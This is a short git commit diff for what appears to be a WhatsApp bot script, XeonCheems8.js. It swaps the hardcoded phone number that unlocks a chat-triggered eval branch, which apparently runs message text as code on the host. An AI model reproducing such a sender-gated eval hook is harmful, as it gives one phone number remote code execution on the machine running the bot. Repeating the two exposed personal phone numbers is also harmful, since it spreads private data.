960521cbebb2e050386409cec501aeefc6a52f20
udavinw <65700932+udavinw@users.noreply.github.com>
2024-01-06 19:09:08 +0530

    𝘜𝘞 𝘛𝘌𝘊𝘏 𝘚𝘏𝘖𝘞 𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗 𝘉𝘖𝘛 𝘝 1.0

--- XeonCheems8.js
+++ XeonCheems8.js
@@ -196,7 +196,7 @@ var xeonytimewisher = `Good Morning 🌄`
 var xeonytimewisher = `Good Morning 🌄`
  } 
 
-		if (isEval && senderNumber == "916909137213") {
+		if (isEval && senderNumber == "94761192103") {
 			let evaled,
 				text = q,
 				{ inspect } = require('util')
